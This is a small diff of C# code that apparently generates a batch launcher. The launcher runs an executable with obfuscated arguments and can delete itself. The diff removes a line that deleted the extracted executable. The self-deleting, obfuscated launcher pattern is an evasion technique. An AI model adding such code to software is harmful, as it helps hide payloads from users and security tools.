@@ -27,7 +27,6 @@ namespace Jlaive
             output.AppendLine(obfuscated2.Item1);
             output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2 + command.Item1 + obfuscated2.Item2);
 
-            output.AppendLine("del \"%~dp0%~nx0.exe\"");
             if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
             output.AppendLine("exit /b");
             return output.ToString();
